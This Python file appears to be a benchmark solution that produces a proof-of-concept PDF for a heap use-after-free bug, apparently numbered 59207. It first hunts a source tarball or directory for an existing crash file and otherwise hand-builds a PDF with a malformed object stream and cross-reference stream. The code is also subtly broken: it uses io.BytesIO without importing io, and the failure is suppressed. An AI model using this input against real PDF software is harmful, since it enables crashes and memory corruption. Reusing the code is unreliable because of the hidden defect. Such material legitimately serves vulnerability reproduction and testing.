import os
import re
import tarfile
import tempfile
import gzip
import bz2
import lzma
import zipfile
from typing import Optional, Tuple, List


def _rank_candidate(path: str, size: int, is_pdf_like: bool, target_size: int = 6431) -> Tuple[int, int]:
    p = path.replace("\\", "/").lower()
    score = 0

    if is_pdf_like:
        score += 200
    if p.endswith(".pdf"):
        score += 150
    if p.endswith(".pdf.gz") or p.endswith(".pdf.xz") or p.endswith(".pdf.bz2"):
        score += 140

    if "59207" in p:
        score += 500
    if "use-after-free" in p or "useafterfree" in p or "uaf" in p:
        score += 260
    if "heap" in p:
        score += 120
    if "xref" in p:
        score += 80
    if "objstm" in p or "obj_stm" in p or "objectstream" in p or "object-stream" in p:
        score += 80

    for token, pts in (
        ("poc", 120),
        ("crash", 120),
        ("repro", 90),
        ("bug", 80),
        ("issue", 60),
        ("regress", 60),
        ("oss-fuzz", 60),
        ("fuzz", 50),
        ("corpus", 40),
        ("afl", 40),
        ("asan", 40),
        ("sanit", 35),
        ("test", 20),
        ("tests", 20),
    ):
        if token in p:
            score += pts

    if size > 0:
        diff = abs(size - target_size)
        score += max(0, 120 - (diff // 32))

    # Secondary objective: smaller is better
    return score, -size


def _looks_like_pdf(data: bytes) -> bool:
    if not data:
        return False
    if data.startswith(b"%PDF-"):
        return True
    # Some fuzz corpora might prepend junk; search early bytes
    head = data[:4096]
    return b"%PDF-" in head


def _decompress_if_needed(path: str, data: bytes, max_out: int = 20_000_000) -> Optional[bytes]:
    p = path.lower()
    try:
        if p.endswith(".gz"):
            d = gzip.decompress(data)
            return d if len(d) <= max_out else None
        if p.endswith(".bz2"):
            d = bz2.decompress(data)
            return d if len(d) <= max_out else None
        if p.endswith(".xz") or p.endswith(".lzma"):
            d = lzma.decompress(data)
            return d if len(d) <= max_out else None
    except Exception:
        return None
    return data


def _extract_best_pdf_from_zip(zip_bytes: bytes, outer_name: str) -> Optional[bytes]:
    try:
        with zipfile.ZipFile(io.BytesIO(zip_bytes)) as zf:  # type: ignore[name-defined]
            best: Tuple[int, int] = (-10**18, -10**18)
            best_bytes: Optional[bytes] = None
            for info in zf.infolist():
                if info.is_dir():
                    continue
                name = info.filename
                ln = name.lower()
                if not (ln.endswith(".pdf") or ln.endswith(".pdf.gz") or ln.endswith(".pdf.xz") or ln.endswith(".pdf.bz2")):
                    continue
                if info.file_size > 20_000_000:
                    continue
                try:
                    raw = zf.read(info)
                except Exception:
                    continue
                raw2 = _decompress_if_needed(name, raw)
                if raw2 is None:
                    continue
                is_pdf = _looks_like_pdf(raw2)
                if not is_pdf:
                    continue
                r = _rank_candidate(f"{outer_name}:{name}", len(raw2), True)
                if r > best:
                    best = r
                    best_bytes = raw2
            return best_bytes
    except Exception:
        return None


def _find_best_embedded_poc_from_tar(src_path: str) -> Optional[bytes]:
    best_rank: Tuple[int, int] = (-10**18, -10**18)
    best_bytes: Optional[bytes] = None

    try:
        tf = tarfile.open(src_path, "r:*")
    except Exception:
        return None

    with tf:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            name = m.name
            ln = name.lower()

            # Prefer direct PDF or compressed PDF
            is_pdf_name = ln.endswith(".pdf") or ln.endswith(".pdf.gz") or ln.endswith(".pdf.xz") or ln.endswith(".pdf.bz2")
            is_zip_name = ln.endswith(".zip")

            if not (is_pdf_name or is_zip_name):
                # Still allow strongly named PoC even without extension, but only if small and named
                if m.size <= 2_000_000 and ("59207" in ln or "use-after-free" in ln or "useafterfree" in ln or re.search(r"\buaf\b", ln)):
                    pass
                else:
                    continue

            if m.size <= 0 or m.size > 25_000_000:
                continue

            f = tf.extractfile(m)
            if f is None:
                continue
            try:
                raw = f.read()
            except Exception:
                continue

            if is_zip_name:
                zbest = _extract_best_pdf_from_zip(raw, name)
                if zbest is not None:
                    r = _rank_candidate(name, len(zbest), True)
                    if r > best_rank:
                        best_rank = r
                        best_bytes = zbest
                continue

            raw2 = _decompress_if_needed(name, raw)
            if raw2 is None:
                continue

            is_pdf = _looks_like_pdf(raw2)
            r = _rank_candidate(name, len(raw2), is_pdf)
            if is_pdf and r > best_rank:
                best_rank = r
                best_bytes = raw2

        return best_bytes


def _find_best_embedded_poc_from_dir(src_dir: str) -> Optional[bytes]:
    best_rank: Tuple[int, int] = (-10**18, -10**18)
    best_path: Optional[str] = None
    best_is_compressed = False

    for root, _, files in os.walk(src_dir):
        for fn in files:
            path = os.path.join(root, fn)
            rel = os.path.relpath(path, src_dir)
            ln = fn.lower()
            if not (ln.endswith(".pdf") or ln.endswith(".pdf.gz") or ln.endswith(".pdf.xz") or ln.endswith(".pdf.bz2")):
                if "59207" not in rel.lower() and "use-after-free" not in rel.lower() and "useafterfree" not in rel.lower() and "uaf" not in rel.lower():
                    continue
            try:
                st = os.stat(path)
            except Exception:
                continue
            if st.st_size <= 0 or st.st_size > 25_000_000:
                continue

            is_comp = ln.endswith(".gz") or ln.endswith(".bz2") or ln.endswith(".xz") or ln.endswith(".lzma")
            # Heuristic: assume pdf-like by extension
            r = _rank_candidate(rel, st.st_size, ln.endswith(".pdf") or ln.endswith(".pdf.gz") or ln.endswith(".pdf.bz2") or ln.endswith(".pdf.xz"))
            if r > best_rank:
                best_rank = r
                best_path = path
                best_is_compressed = is_comp

    if best_path is None:
        return None
    try:
        with open(best_path, "rb") as f:
            raw = f.read()
        raw2 = _decompress_if_needed(best_path, raw)
        if raw2 is None:
            return None
        if _looks_like_pdf(raw2):
            return raw2
    except Exception:
        return None
    return None


def _make_fallback_pdf() -> bytes:
    def obj(num: int, body: bytes) -> bytes:
        return (f"{num} 0 obj\n").encode() + body + b"\nendobj\n"

    def stream_obj(num: int, dict_items: bytes, stream_data: bytes) -> bytes:
        d = dict_items.rstrip()
        if not d.startswith(b"<<"):
            d = b"<< " + d
        if not d.endswith(b">>"):
            d = d + b" >>"
        d = d + b"\n"
        return (f"{num} 0 obj\n").encode() + d + b"stream\n" + stream_data + b"\nendstream\nendobj\n"

    header = b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"

    o1 = obj(1, b"<< /Type /Catalog /Pages 2 0 R >>")
    o2 = obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    o3 = obj(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources 10 0 R /Contents 4 0 R >>")

    content = b"q\nQ\n"
    o4 = stream_obj(4, f"<< /Length {len(content)} >>".encode(), content)

    obj10 = b"<< /ProcSet [/PDF] >>"
    obj1000 = b"null"
    body = obj10 + b"\n" + obj1000 + b"\n"
    offset2 = len(obj10) + 1
    hdr = (f"10 0 1000 {offset2} ").encode() + b"\n"
    first = len(hdr)
    objstm_data = hdr + body
    o5 = stream_obj(
        5,
        (f"<< /Type /ObjStm /N 2 /First {first} /Length {len(objstm_data)} >>").encode(),
        objstm_data,
    )

    parts = [header, o1, o2, o3, o4, o5]
    offsets = {}
    cur = 0
    for p in parts:
        if p is header:
            cur += len(p)
            continue
        m = re.match(br"(\d+)\s+0\s+obj", p[:32])
        if m:
            offsets[int(m.group(1))] = cur
        cur += len(p)

    offset6 = cur

    def be(n: int, w: int) -> bytes:
        if n < 0:
            n = 0
        return int(n).to_bytes(w, "big", signed=False)

    W0, W1, W2 = 1, 4, 2
    entries: List[bytes] = []
    size = 11  # 0..10 inclusive

    # 0: free
    entries.append(bytes([0]) + be(0, W1) + be(65535, W2))
    for i in range(1, size):
        if i in offsets:
            entries.append(bytes([1]) + be(offsets[i], W1) + be(0, W2))
        elif i == 6:
            entries.append(bytes([1]) + be(offset6, W1) + be(0, W2))
        elif i == 10:
            entries.append(bytes([2]) + be(5, W1) + be(0, W2))
        else:
            entries.append(bytes([0]) + be(0, W1) + be(0, W2))

    xref_data = b"".join(entries)
    xref_dict = (
        b"<< /Type /XRef"
        + b" /Size 11"
        + b" /Root 1 0 R"
        + b" /W [1 4 2]"
        + b" /Index [0 11]"
        + (f" /Length {len(xref_data)}").encode()
        + b" >>"
    )

    o6 = stream_obj(6, xref_dict, xref_data)

    pdf = b"".join(parts) + o6 + b"startxref\n" + str(offset6).encode() + b"\n%%EOF\n"
    return pdf


class Solution:
    def solve(self, src_path: str) -> bytes:
        if src_path and os.path.isdir(src_path):
            b = _find_best_embedded_poc_from_dir(src_path)
            if b is not None:
                return b
            return _make_fallback_pdf()

        b = _find_best_embedded_poc_from_tar(src_path)
        if b is not None:
            return b

        return _make_fallback_pdf()